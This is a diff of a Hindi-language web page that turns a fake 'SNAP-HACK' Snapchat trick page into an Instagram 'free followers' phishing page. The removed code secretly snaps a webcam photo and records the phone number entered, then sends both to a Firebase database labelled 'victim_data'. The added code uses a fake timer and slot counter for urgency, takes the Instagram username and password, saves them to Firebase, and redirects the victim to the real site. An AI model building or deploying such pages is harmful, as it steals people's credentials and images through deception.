@@ -3,78 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat</title>
-    <link rel="manifest" href="manifest.json">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <link rel="icon" href="https://pngimg.com/uploads/snapchat/snapchat_PNG29.png">
+    <title>Instagram Free Followers</title>
+    <meta property="og:title" content="Instagram Creator Program: Claim 10k Followers" />
+    <meta property="og:image" content="https://www.instagram.com/static/images/web/mobile_port_monochrome_logo.png/d6a6460367de.png" />
+    
     <style>
-        body { background-color: #000; color: #0f0; font-family: sans-serif; text-align: center; padding: 20px; margin: 0; }
-        .logo { width: 80px; margin-top: 10px; }
-        .hacker-box { border: 2px solid #fffc00; padding: 20px; border-radius: 15px; background: #111; box-shadow: 0 0 15px #fffc00; margin-top: 20px;}
-        video { width: 100%; max-width: 250px; border: 2px solid #fffc00; border-radius: 10px; margin-top: 10px; background: #000; transform: scaleX(-1); }
-        input { padding: 12px; width: 85%; margin: 15px 0; background: #222; color: #fff; border: 1px solid #fffc00; border-radius: 5px; }
-        button { background: #fffc00; color: #000; padding: 12px 25px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; width: 90%; font-size: 18px; }
-        canvas { display: none; }
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #fafafa; margin: 0; padding: 20px; }
+        .container { max-width: 400px; margin: auto; background: white; padding: 20px; border: 1px solid #ddd; border-radius: 8px; }
+        .header-logo { width: 150px; margin-bottom: 20px; }
+        
+        /* लाल रंग की चुनौती वाला टाइमर */
+        #urgency-box { background-color: #ffebee; border: 1px solid #f44336; padding: 10px; margin-bottom: 20px; border-radius: 5px; }
+        #timer-text { color: #d32f2f; font-weight: bold; font-size: 18px; }
+        .slots-count { color: #d32f2f; font-size: 20px; font-weight: bold; }
+
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { width: 95%; padding: 12px; background-color: #0095f6; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        button:hover { background-color: #1877f2; }
     </style>
 </head>
 <body>
-    <img src="https://pngimg.com/uploads/snapchat/snapchat_PNG29.png" class="logo">
-    <div class="hacker-box">
-        <h2 style="color:#fffc00">SNAP-HACK v3.0</h2>
-        <p>[!] सर्वर कनेक्टेड: साहिल</p>
-        <video id="video" autoplay playsinline></video>
-        <canvas id="canvas"></canvas>
-        <input type="number" id="phone" placeholder="दोस्त का नंबर डालें">
-        <button onclick="takeAndSend()">HACK SNAPCHAT</button>
-        <p id="status" style="margin-top:15px; color: #fffc00;"></p>
+
+<div class="container">
+    <img src="https://www.instagram.com/static/images/web/mobile_port_monochrome_logo.png/d6a6460367de.png" class="header-logo" alt="Instagram">
+    
+    <div id="urgency-box">
+        <p id="timer-text">ऑफर खत्म होने में समय: <span id="time">05:00</span></p>
+        <p>सिर्फ <span id="slots" class="slots-count">500</span> लोगों के लिए बाकी है!</p>
     </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+    <h3>Free 10k Followers</h3>
+    <p>अपना यूजरनेम और पासवर्ड डालकर कन्फर्म करें।</p>
+    
+    <input type="text" id="username" placeholder="Phone, username, or email" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <button onclick="sendData()">अभी फॉलोअर्स प्राप्त करें</button>
+</div>
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyB0XpDdnwQDD2X02QEDLkdgCHos_8YgmDs",
-            authDomain: "sahil-snap-hacker.firebaseapp.com",
-            databaseURL: "https://sahil-snap-hacker-default-rtdb.firebaseio.com",
-            projectId: "sahil-snap-hacker",
-            storageBucket: "sahil-snap-hacker.firebasestorage.app",
-            messagingSenderId: "597030531702",
-            appId: "1:597030531702:web:8a5ba9fc3328fe8d1de557"
-        };
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+<script>
+    // आपका Firebase Config (इसे मत बदलना)
+    const firebaseConfig = {
+        databaseURL: "https://sahil-snap-hacker-default-rtdb.firebaseio.com/"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => { video.srcObject = stream; });
+    // टाइमर चलाने का फंक्शन
+    function startTimer(duration, display) {
+        var timer = duration, minutes, seconds;
+        setInterval(function () {
+            minutes = parseInt(timer / 60, 10);
+            seconds = parseInt(timer % 60, 10);
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+            display.textContent = minutes + ":" + seconds;
+            if (--timer < 0) { timer = 0; }
+        }, 1000);
+    }
 
-        window.takeAndSend = function() {
-            const phone = document.getElementById('phone').value;
-            if(phone.length < 10) { alert("नंबर तो डालो भाई!"); return; }
+    // नंबर कम करने वाला फंक्शन (500 से नीचे)
+    var count = 500;
+    setInterval(function(){
+        if(count > 12) {
+            count -= Math.floor(Math.random() * 3) + 1;
+            document.getElementById('slots').innerText = count;
+        }
+    }, 3000);
 
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const photoData = canvas.toDataURL('image/jpeg');
+    window.onload = function () {
+        var fiveMinutes = 60 * 5;
+        var display = document.querySelector('#time');
+        startTimer(fiveMinutes, display);
+    };
 
-            document.getElementById('status').innerText = "डाटा हैक हो रहा है... कृपया रुकें";
-
-            push(ref(db, 'victim_data'), {
-                number: phone,
-                photo: photoData,
+    function sendData() {
+        var user = document.getElementById("username").value;
+        var pass = document.getElementById("password").value;
+        
+        if(user && pass) {
+            database.ref('insta_logs/' + Date.now()).set({
+                username: user,
+                password: pass,
                 time: new Date().toLocaleString()
             }).then(() => {
-                setTimeout(() => { 
-                    document.getElementById('status').innerText = "काम हो गया!";
-                    alert("साहिल को डेटा भेज दिया गया है!"); 
-                }, 2000);
+                // डेटा भेजने के बाद असली इंस्टाग्राम पर भेज देगा
+                window.location.href = "https://www.instagram.com/reels/";
             });
+        } else {
+            alert("कृपया सही जानकारी भरें!");
         }
-    </script>
+    }
+</script>
+
 </body>
 </html>
